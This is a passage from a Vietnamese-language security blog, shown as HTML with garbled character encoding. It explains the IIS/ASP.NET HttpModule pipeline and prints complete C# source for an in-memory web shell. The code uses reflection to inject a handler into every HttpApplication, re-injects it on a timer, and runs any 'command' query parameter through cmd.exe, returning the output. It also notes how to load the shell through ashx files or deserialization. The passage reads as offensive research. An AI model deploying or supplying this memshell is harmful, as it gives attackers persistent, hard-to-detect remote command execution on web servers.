src=https://hackmd.io/_uploads/Syb2DaoBWl.png loading=lazy alt=image><br>HÃ m AddEvent chá»©a logic chÃ­nh Ä‘á»ƒ thÃªm 1 event vÃ o HttpModule:<br><img src=https://hackmd.io/_uploads/r1ITPToHWg.png loading=lazy alt=image><br></p><ul><li>Event Ä‘Æ°á»£c index tÆ°Æ¡ng á»©ng vá»›i tÃªn Ä‘á»ƒ láº¥y ra giÃ¡ trá»‹ sá»‘ nguyÃªn báº±ng EventToIndex. VÃ­ dá»¥ á»Ÿ Ä‘Ã¢y event AuthenticateRequest sáº½ tráº£ vá» giÃ¡ trá»‹ lÃ  1<br><img src=https://hackmd.io/_uploads/ry-W_aiSZg.png loading=lazy alt=image><br></li><li>IIS sáº½ láº¥y ra danh sÃ¡ch cÃ¡c object HttpApplicationIExecutionStep trong máº£ng <code>_moduleSteps</code> táº¡i vÃ­ trÃ­ thá»© index cá»§a event Ä‘ang xá»­ lÃ½</li><li>Náº¿u list láº¥y ra khÃ¡c rá»—ng, tiáº¿n hÃ nh thÃªm event vÃ o list trÃªn</li></ul><h3 id=deploy-2>Deploy</h3><p>Dá»±a vÃ o nhá»¯ng gÃ¬ Ä‘Ã£ tÃ¬m hiá»ƒu, HttpModule memshell cáº§n bao gá»“m:</p><ul><li>HÃ m Loop tiáº¿n hÃ nh inject táº¥t cáº£ cÃ¡c HttpApplication cÃ³ trong <code>_freeList</code></li><li>Class chÃ­nh sáº½ gá»i Ä‘áº¿n hÃ m Loop sau 1 thá»i gian nháº¥t Ä‘á»‹nh, Ä‘áº£m báº£o cÃ¡c instance HttpApplication má»›i Ä‘Æ°á»£c khá»Ÿi táº¡o cÅ©ng sáº½ bá»‹ inject</li><li>HÃ m InjectHandler cÃ³ nhiá»‡m vá»¥ láº¥y ra ModuleStep thÃ´ng qua hÃ m GetModuleSteps, kiá»ƒm tra náº¿u káº¿t quáº£ tráº£ vá» khÃ¡c null tiáº¿n hÃ nh sá»­ dá»¥ng hÃ m ClearInject Ä‘á»ƒ xÃ³a EventHandler Ä‘Ã£ inject vÃ  thÃªm cÃ¡i má»›i. TrÃ¡nh trÆ°á»ng há»£p chá»‰ thÃªm khiáº¿n thá»±c hiá»‡n cÃ¢u lá»‡nh láº¡i nhiá»u láº§n.</li><li>CÃ¡c class Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘a pháº§n lÃ  private vÃ  internal nÃªn cáº§n sá»­ dá»¥ng reflection khÃ¡ nhiá»u</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-csharp data-lang=csharp><span class=line><span class=cl><span class=p>&lt;</span><span class=n>script</span> <span class=n>runat</span><span class=p>=</span><span class=s>&#34;server&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=kd>public</span> <span class=k>class</span> <span class=nc>ModuleMemShell</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Assembly</span> <span class=n>sysWeb</span> <span class=p>=</span> <span class=k>typeof</span><span class=p>(</span><span class=n>HttpApplication</span><span class=p>).</span><span class=n>Assembly</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>HAFClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.HttpApplicationFactory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>PipelineModuleStepContainerClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.PipelineModuleStepContainer&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>HttpApplicationClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.HttpApplication&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>PipelineModuleStepContainerArrayClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.PipelineModuleStepContainer[]&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>SyncEventExecutionStepClass</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.HttpApplication+SyncEventExecutionStep&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>iExecutionStepType</span> <span class=p>=</span> <span class=n>sysWeb</span><span class=p>.</span><span class=n>GetType</span><span class=p>(</span><span class=s>&#34;System.Web.HttpApplication+IExecutionStep&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>ListIExecutionStepClass</span> <span class=p>=</span> <span class=k>typeof</span><span class=p>(</span><span class=n>List</span><span class=p>&lt;&gt;).</span><span class=n>MakeGenericType</span><span class=p>(</span><span class=n>iExecutionStepType</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>Type</span> <span class=n>ListIExecutionStepArrayClass</span> <span class=p>=</span> <span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>MakeArrayType</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=kd>private</span> <span class=kd>static</span> <span class=n>BindingFlags</span> <span class=n>flag</span> <span class=p>=</span> <span class=n>BindingFlags</span><span class=p>.</span><span class=n>Instance</span> <span class=p>|</span> <span class=n>BindingFlags</span><span class=p>.</span><span class=n>NonPublic</span> <span class=p>|</span> <span class=n>BindingFlags</span><span class=p>.</span><span class=n>Public</span> <span class=p>|</span> <span class=n>BindingFlags</span><span class=p>.</span><span class=n>Static</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=n>ModuleMemShell</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>previous_timer</span> <span class=p>=</span> <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Application</span><span class=p>[</span><span class=s>&#34;loop&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>previous_timer</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                    <span class=p>((</span><span class=n>System</span><span class=p>.</span><span class=n>Threading</span><span class=p>.</span><span class=n>Timer</span><span class=p>)</span><span class=n>previous_timer</span><span class=p>).</span><span class=n>Dispose</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>timer</span> <span class=p>=</span> <span class=k>new</span> <span class=n>System</span><span class=p>.</span><span class=n>Threading</span><span class=p>.</span><span class=n>Timer</span><span class=p>(</span><span class=n>Loop</span><span class=p>,</span> <span class=kc>null</span><span class=p>,</span> <span class=m>0</span><span class=p>,</span> <span class=m>3000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Application</span><span class=p>[</span><span class=s>&#34;loop&#34;</span><span class=p>]</span> <span class=p>=</span> <span class=n>timer</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=s>&#34;HttpModule Memshell Injected!!!!&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>void</span> <span class=n>Loop</span><span class=p>(</span><span class=n>Object</span> <span class=n>stateInfo</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>appFactory</span> <span class=p>=</span> <span class=n>HAFClass</span><span class=p>.</span><span class=n>GetField</span><span class=p>(</span><span class=s>&#34;_theApplicationFactory&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=kc>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>_freeList</span> <span class=p>=</span> <span class=n>HAFClass</span><span class=p>.</span><span class=n>GetField</span><span class=p>(</span><span class=s>&#34;_freeList&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>appFactory</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>foreach</span> <span class=p>(</span><span class=kt>var</span> <span class=n>httpApplication</span> <span class=k>in</span> <span class=p>(</span><span class=n>IEnumerable</span><span class=p>)</span><span class=n>_freeList</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>InjectHandler</span><span class=p>((</span><span class=n>HttpApplication</span><span class=p>)</span><span class=n>httpApplication</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>void</span> <span class=n>InjectHandler</span><span class=p>(</span><span class=n>HttpApplication</span> <span class=n>httpApplication</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kt>object</span> <span class=n>list</span> <span class=p>=</span> <span class=n>GetModuleSteps</span><span class=p>(</span><span class=n>httpApplication</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>list</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>ClearInject</span><span class=p>(</span><span class=n>list</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>InstallNew</span><span class=p>(</span><span class=n>list</span><span class=p>,</span> <span class=n>httpApplication</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kt>object</span> <span class=n>GetModuleSteps</span><span class=p>(</span><span class=n>HttpApplication</span> <span class=n>httpApplication</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=k>foreach</span> <span class=p>(</span><span class=kt>var</span> <span class=n>notification</span> <span class=k>in</span> <span class=n>Enum</span><span class=p>.</span><span class=n>GetValues</span><span class=p>(</span><span class=k>typeof</span><span class=p>(</span><span class=n>RequestNotification</span><span class=p>))){</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>notification_index</span> <span class=p>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>PipelineModuleStepContainerClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;EventToIndex&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=kc>null</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>notification</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>ModuleContainers</span> <span class=p>=</span> <span class=p>(</span><span class=n>HttpApplicationClass</span><span class=p>.</span><span class=n>GetProperty</span><span class=p>(</span><span class=s>&#34;ModuleContainers&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>httpApplication</span><span class=p>));</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>ModuleContainersLength</span> <span class=p>=</span> <span class=p>(</span><span class=n>Int32</span><span class=p>)</span><span class=n>PipelineModuleStepContainerArrayClass</span><span class=p>.</span><span class=n>GetProperty</span><span class=p>(</span><span class=s>&#34;Length&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>ModuleContainers</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=p>=</span> <span class=m>0</span><span class=p>;</span> <span class=n>i</span> <span class=p>&lt;</span> <span class=n>ModuleContainersLength</span><span class=p>;</span> <span class=n>i</span><span class=p>++){</span>
</span></span><span class=line><span class=cl>                    <span class=kt>var</span> <span class=n>moduleContainer</span> <span class=p>=</span> <span class=n>PipelineModuleStepContainerArrayClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Get&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>ModuleContainers</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>i</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>                    <span class=kt>var</span> <span class=n>_moduleSteps</span> <span class=p>=</span> <span class=n>PipelineModuleStepContainerClass</span><span class=p>.</span><span class=n>GetField</span><span class=p>(</span><span class=s>&#34;_moduleSteps&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>moduleContainer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>_moduleSteps</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                        <span class=kt>var</span> <span class=n>list</span> <span class=p>=</span> <span class=n>ListIExecutionStepArrayClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Get&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>_moduleSteps</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>notification_index</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=n>list</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                            <span class=k>return</span> <span class=n>list</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                        <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>void</span> <span class=n>InstallNew</span><span class=p>(</span><span class=kt>object</span> <span class=n>list</span><span class=p>,</span> <span class=n>HttpApplication</span> <span class=n>httpApplication</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>syncEventExecutionStep</span> <span class=p>=</span> <span class=n>SyncEventExecutionStepClass</span><span class=p>.</span><span class=n>GetConstructor</span><span class=p>(</span><span class=n>flag</span><span class=p>,</span> <span class=kc>null</span><span class=p>,</span> <span class=k>new</span> <span class=n>Type</span><span class=p>[]</span> <span class=p>{</span> <span class=k>typeof</span><span class=p>(</span><span class=n>HttpApplication</span><span class=p>),</span> <span class=k>typeof</span><span class=p>(</span><span class=n>EventHandler</span><span class=p>)</span> <span class=p>},</span> <span class=kc>null</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>.</span><span class=n>Invoke</span><span class=p>(</span><span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>httpApplication</span><span class=p>,</span> <span class=p>(</span><span class=n>EventHandler</span><span class=p>)</span><span class=n>CustomHandler</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>            <span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;Add&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>list</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>syncEventExecutionStep</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>void</span> <span class=n>ClearInject</span><span class=p>(</span><span class=kt>object</span> <span class=n>list</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=kt>var</span> <span class=n>list_count</span> <span class=p>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>GetProperty</span><span class=p>(</span><span class=s>&#34;Count&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>list</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=p>=</span> <span class=m>0</span><span class=p>;</span> <span class=n>i</span> <span class=p>&lt;</span> <span class=n>list_count</span><span class=p>;</span> <span class=n>i</span><span class=p>++){</span>
</span></span><span class=line><span class=cl>                <span class=kt>var</span> <span class=n>syncEventExecutionStep</span> <span class=p>=</span> <span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;get_Item&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>list</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>i</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>syncEventExecutionStep</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                    <span class=kt>var</span> <span class=n>handler</span> <span class=p>=</span> <span class=p>(</span><span class=n>Delegate</span><span class=p>)</span><span class=n>SyncEventExecutionStepClass</span><span class=p>.</span><span class=n>GetProperty</span><span class=p>(</span><span class=s>&#34;Handler&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>GetValue</span><span class=p>(</span><span class=n>syncEventExecutionStep</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=kt>var</span> <span class=n>handler_name</span> <span class=p>=</span> <span class=n>handler</span><span class=p>.</span><span class=n>Method</span><span class=p>.</span><span class=n>DeclaringType</span><span class=p>.</span><span class=n>FullName</span> <span class=p>+</span> <span class=s>&#34;.&#34;</span> <span class=p>+</span> <span class=n>handler</span><span class=p>.</span><span class=n>Method</span><span class=p>.</span><span class=n>Name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>handler_name</span> <span class=p>==</span> <span class=s>&#34;ASP.httpmodulememshell_aspx+ModuleMemShell.CustomHandler&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                        <span class=n>ListIExecutionStepClass</span><span class=p>.</span><span class=n>GetMethod</span><span class=p>(</span><span class=s>&#34;RemoveAt&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>).</span><span class=n>Invoke</span><span class=p>(</span><span class=n>list</span><span class=p>,</span> <span class=k>new</span> <span class=kt>object</span><span class=p>[]</span> <span class=p>{</span> <span class=n>i</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=kd>public</span> <span class=k>void</span> <span class=n>CustomHandler</span><span class=p>(</span><span class=kt>object</span> <span class=n>sender</span><span class=p>,</span> <span class=n>EventArgs</span> <span class=n>e</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=n>HttpContext</span> <span class=n>context</span> <span class=p>=</span> <span class=n>HttpContext</span><span class=p>.</span><span class=n>Current</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>String</span> <span class=n>cmd</span> <span class=p>=</span> <span class=n>context</span><span class=p>.</span><span class=n>Request</span><span class=p>.</span><span class=n>QueryString</span><span class=p>[</span><span class=s>&#34;command&#34;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>cmd</span> <span class=p>!=</span> <span class=kc>null</span><span class=p>){</span>
</span></span><span class=line><span class=cl>                <span class=n>Process</span> <span class=n>p</span> <span class=p>=</span> <span class=k>new</span> <span class=n>Process</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>FileName</span> <span class=p>=</span> <span class=s>&#34;cmd.exe&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>Arguments</span> <span class=p>=</span> <span class=s>&#34;/c&#34;</span> <span class=p>+</span> <span class=n>cmd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>UseShellExecute</span> <span class=p>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardOutput</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>StartInfo</span><span class=p>.</span><span class=n>RedirectStandardError</span> <span class=p>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>p</span><span class=p>.</span><span class=n>Start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=kt>byte</span><span class=p>[]</span> <span class=n>data</span> <span class=p>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>UTF8</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>p</span><span class=p>.</span><span class=n>StandardOutput</span><span class=p>.</span><span class=n>ReadToEnd</span><span class=p>()</span> <span class=p>+</span> <span class=n>p</span><span class=p>.</span><span class=n>StandardError</span><span class=p>.</span><span class=n>ReadToEnd</span><span class=p>());</span>
</span></span><span class=line><span class=cl>                <span class=n>context</span><span class=p>.</span><span class=n>Response</span><span class=p>.</span><span class=n>Write</span><span class=p>(</span><span class=n>Encoding</span><span class=p>.</span><span class=n>Default</span><span class=p>.</span><span class=n>GetString</span><span class=p>(</span><span class=n>data</span><span class=p>));</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=n>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>&lt;%</span>
</span></span><span class=line><span class=cl>    <span class=k>new</span> <span class=n>ModuleMemShell</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>%&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>Cuá»‘i cÃ¹ng lÃ  exec command táº¡i Ä‘Æ°á»ng dáº«n báº¥t ká»³:<br><img src=https://hackmd.io/_uploads/HJBS9psS-g.png loading=lazy alt=image><br>CÃ³ má»™t lÆ°u Ã½ nhÆ° sau: Khi load memshell nÃ y báº±ng file ashx hoáº·c deser, code inject thÃ¬ cáº§n sá»­a Ä‘á»•i handler_name cho phÃ¹ há»£p Ä‘á»ƒ code mÃ¬nh cÃ³ thá»ƒ xÃ³a Ä‘Æ°á»£c Ä‘Ãºng event, táº¡i Ä‘Ã¢y mÃ¬nh Ä‘ang vÃ­ dá»¥ load memshell code báº±ng file aspx.</p></section><footer class=article-footer><section class=article-tags><a href=/tags/dotnet/>DotNet</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
